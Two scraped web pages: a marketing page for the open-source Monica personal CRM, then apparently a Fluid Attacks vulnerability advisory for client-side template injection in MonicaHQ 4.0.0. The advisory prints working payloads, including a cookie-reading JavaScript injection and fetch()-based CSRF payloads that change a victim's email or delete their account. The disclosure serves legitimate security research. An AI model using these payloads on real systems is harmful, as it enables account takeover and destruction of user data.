=== Content from www.monicahq.com_5fdd532f_20250114_230424.html ===

ðŸ¤— Announcing [OfficeLife](https://officelife.io), our new open source product â€“ the all-in-one tool to manage a company.

[![Monica logo](https://www.monicahq.com/img/logo_vertical.png)](https://www.monicahq.com)

[Features](https://www.monicahq.com/features)
[Pricing](https://www.monicahq.com/pricing)
[API documentation](https://www.monicahq.com/api)
[Blog](https://www.monicahq.com/blog)
[Login](https://app.monicahq.com/login)
 [Sign Up](https://app.monicahq.com/register)

# Open source personal CRM.

## Monica helps you organize the social interactions with your loved ones.

Organize. Follow-up. Strengthen your relationships.

 [Signup for free](https://app.monicahq.com/register)

No credit card required. Or [install it](https://github.com/monicahq/monica/blob/4.x/docs/installation/readme.md) on your own server.

## 44,123

users registered

## 340,273

contacts managed

## 28,321

activities logged

## 89,918

reminders set

## What is Monica?

Can you remember the names of the children of all your friends? Can you remember the wedding anniversary of your brother? Can you tell the last time you called your grand mother and what you talked about?

Monica lets you quickly and easily log all those information so you can be a **better friend**, **family member** or **spouse**.

## Your personal rolodex

### Everything in one place

The more information you put in Monica, the easier it will be to remember everything. Monica provides an easy-to-use interface to store everything you know about your loved ones.

* Information about family
* Work information
* Relation between contacts
* Pets
* Activites done together
* Reminders about important dates

* Gift ideas or gifts you've made
* Tasks
* Debts you owe or owned
* Journal
* Indicate how your day went

## Monica empowers people who want to be better

Monica is for people who have jobs, a family, and are busy trying to find a good work/life balance. So busy, that they donâ€™t have time anymore to remember to call a friend, say happy birthday to a nephew, or remember to invite someone special for dinner next week. The older we get, the more life gets in the way. Itâ€™s sad, but itâ€™s the reality.

I created Monica to help these people.

Monica is not a social network. It will never be. It's a private place for your eyes only, that you own, without any ads or malicious software that will read your data, where you can safely document what you know about who you love. And if you want another level of security, you can always [install Monica](https://github.com/monicahq/monica#get-started) on a server that you own, for free.

### Built for people. With people.

Monica is open source. That means the code is [publicly available](https://github.com/monicahq/monica), scrutinized by thousands. Dozens of people have already contributed to the project. That level of transparency ensures both the security of the application, and your peace of mind concerning what we do with your data (nothing, in fact).

OPEN
SOURCE

Proudly

Features

* [Contact management](https://www.monicahq.com/features)
* [Powerful dashboard](https://www.monicahq.com/features/dashboard)
* [Journal](https://www.monicahq.com/features/journal)

Company

* [Team](https://www.monicahq.com/team)
* [Blog](https://www.monicahq.com/blog)
* [Newsletter](https://tinyletter.com/monicahq)

Community

* [Changelog](https://www.monicahq.com/changelog)
* [Source code on GitHub](https://github.com/monicahq/monica)
* [Issue tracker](https://github.com/monicahq/monica/issues)
* [Mastodon](https://phpc.social/%40monica)
* [Twitter](https://twitter.com/MonicaHQ_app)

Resources

* [Terms](https://www.monicahq.com/terms)
* [Privacy](https://www.monicahq.com/privacy)
* [Refund policy](https://www.monicahq.com/refund)
* Contact

![](https://www.monicahq.com/img/logo_vertical.png)

Â© 2018 â€” 2025

Proudly

Canadian



=== Content from fluidattacks.com_def1697a_20250114_230422.html ===
[Contact us](/contact-us/)SearchEnglishEnglishEspaÃƒÂ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# MonicaHQ 4.0.4 - Client Side Template Injection

## Summary

|  |  |
| --- | --- |
| **Name** | MonicaHQ 4.0.4 - Client Side Template Injection |
| **Code name** | [napoli](https://es.wikipedia.org/wiki/Chizzo_N%C3%A1poli) |
| **Product** | MonicaHQ |
| **Affected versions** | 4.0.0 |
|
| **State** | Public |
| **Release date** | 2023-04-17 |

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | Client Side Template Injection |
| **Rule** | [010. Stored cross-site scripting (XSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/010) |
| **Remote** | Yes |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H |
| **CVSSv3.1 Base Score** | 8.0 |
| **Exploit available** | No |
| **CVE ID(s)** | [CVE-2023-1031](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1031), [CVE-2023-1094](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1094), [CVE-2023-30787](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30787), [CVE-2023-30788](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30788), [CVE-2023-30789](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30789), [CVE-2023-30790](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30790) |

## Description

MonicaHQ version 4.0.0 allows an authenticated remote attacker to execute
malicious code in the application. This is possible because the application
does not correctly validate the data entered by the user.

## Vulnerability

This vulnerability occurs because the application does not correctly validate
the data entered by users when creating new contacts within the application, as
well as the characteristics of the contacts themselves.

## Exploitation

First we create a contact:

![CSTI-Monica](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/create-contact.png)

After creating the contact you can edit its characteristics. At this point
there are many inputs which are vulnerable. The PoC of the exploitation of one
of them will be shown but it applies to all the others. In this case we edit
the food preference feature. We inject the following payload which interprets:

```
{{7*7}}

```

At this point we can say that it is vulnerable to CSTI since we see the value
49 reflected.

![CSTI-Monica](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/test-csti.png)

![CSTI-Monica](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/out-csti.png)

Thanks to this it is possible to inject JavaScript code, which is interpreted.

```
{{{}.toString.constructor('confirm(document.cookie)')()}}

```

![CSTI-Monica](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/out-xss.png)

![CSTI-Monica](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/xsrf.png)

As the XSS is stored, CSRF can be applied to change another user's email
address or delete their account.

## Evidence of exploitation

### CSTI to CSRF Change mail

```
{{ fetch('http://localhost:8080/settings/save', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded'
 },
 body: new URLSearchParams({
 _token: document.querySelector('[name="_token"]').value,
 id: 3,
 first_name: 'test',
 last_name: 'testt',
 email: 'attacker@test.com',
 locale: 'es',
 currency_id: 4,
 temperature_scale: 'celsius',
 timezone: 'Europe/Madrid',
 reminder_time: '12:00',
 name_order: 'firstname_lastname_nickname',
 fluid_container: 1
 })
 })
 .then(res => res.text())
 .then(text => window.location.href = text)
}}

```

![RCE-FIleManager](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/Monica-CSRF-Contact(1).gif)

### CSTI to CSRF Delete Account

```
{{
 fetch('http://localhost:8080/settings/delete', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded'
 },
 body: '_token=' + document.querySelector('[name="_token"]').value
 })
 .then(res => res.text())
 .then(text => window.location.href = text)
}}

```

![RCE-FileManager](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/monica-delete-account.gif)

## Our security policy

We have reserved the CVE-2023-1031, CVE-2023-1094, CVE-2023-30787, CVE-2023-30788,
CVE-2023-30789, CVE-2023-30790 to refer to this issue from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: MonicaHQ 4.0.0
* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Lautaro Casanova](https://www.linkedin.com/in/beta-casanova/)
from Fluid Attacks' Offensive Team.

## References

**Vendor page** <https://github.com/monicahq/monica>

**Release page** <https://github.com/monicahq/monica/releases/tag/v4.0.0>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-03-30

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-03-30

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-04-17

Vendor Confirmed the vulnerability.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-04-17

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Ã‚Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)


